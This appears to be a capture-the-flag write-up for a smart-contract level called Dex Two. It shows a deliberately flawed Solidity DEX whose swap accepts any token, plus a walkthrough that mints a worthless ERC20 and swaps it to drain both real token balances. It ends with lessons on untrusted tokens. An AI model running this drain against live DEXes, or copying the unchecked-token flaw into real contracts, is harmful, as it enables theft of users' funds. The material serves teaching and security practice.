# Dex Two

## Challenge Description

This level will ask you to break `DexTwo`, a subtlely modified `Dex` contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the `DexTwo` contract to succeed in this level.

You will still start with 10 tokens of `token1` and 10 of `token2`. The DEX contract still starts with 100 of each token.

Things that might help:

-   How has the `swap` method been modified?

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(
        address token_address,
        uint amount
    ) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint amount) public {
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(
        address from,
        address to,
        uint amount
    ) public view returns (uint) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

## Challenge Solution Walkthrough

To exploit the modified `swap()` function and drain all of the funds from the `Dex` contract, follow these steps:

1. Deploy the `DexTwoSolution` contract, which is an ERC20 token contract with an initial supply of 400 tokens. Set the `initialSupply` to 400 when deploying the contract. Use the following Solidity code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoSolution is ERC20 {
    constructor(uint256 initialSupply) ERC20("DexTwoSolution", "DTS") {
        _mint(msg.sender, initialSupply);
    }
}
```

2. Deploy the `DexTwo` contract, which is the target contract for this challenge.

3. Transfer 100 `DTS` tokens to the `DexTwo` contract by calling the `transfer()` function of the `DTS` token contract. Also, execute the `approve()` function of the `DTS` token contract to allow the `DexTwo` contract to spend your tokens.

4. Obtain the addresses of `token1`, `token2`, and `DTS` tokens by executing the following commands in the console:

```javascript
> const token1 = await contract.token1()
> const token2 = await contract.token2()
> const dtsToken = "0xDEcc7b8C6d11385f6ed2d0df45EcAc1D654F9DA4"
```

5. Initially, the token amounts for each account are as follows:

|          | Token1 | Token2 | DTS |
| :------: | :----: | :----: | :-: |
|  `Dex`   |  100   |  100   | 100 |
| `player` |   10   |   10   | 300 |

6. Execute the command below to transfer 100 `DTS` tokens to the `DexTwo` contract and receive 100 `token1` in return:

```javascript
> await contract.swap(dtsToken, token1, 100)
```

After this swap, the updated token amounts are as follows:

|          | Token1 | Token2 | DTS |
| :------: | :----: | :----: | :-: |
|  `Dex`   |   0    |  100   | 200 |
| `player` |  110   |   10   | 200 |

7. Proceed by transferring 200 `DTS` tokens to the `DexTwo` contract and receiving 100 `token2` in return:

```javascript
> await contract.swap(dtsToken, token2, 200)
```

After this swap, the updated token amounts become:

|          | Token1 | Token2 | DTS |
| :------: | :----: | :----: | :-: |
|  `Dex`   |   0    |   0    | 400 |
| `player` |  110   |  110   |  0  |

By following these steps, you will successfully drain all of the funds from the `DexTwo` contract by exploiting the modified `swap()` function and utilizing the `DTS` token contract.

## Challenge Description After Solving

As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.

Just because a contract claims to implement the [ERC20 spec](https://eips.ethereum.org/EIPS/eip-20) does not mean it's trust worthy.

Some tokens deviate from the ERC20 spec by not returning a boolean value from their `transfer` methods. See [Missing return value bug - At least 130 tokens affected](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca).

Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.

If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.
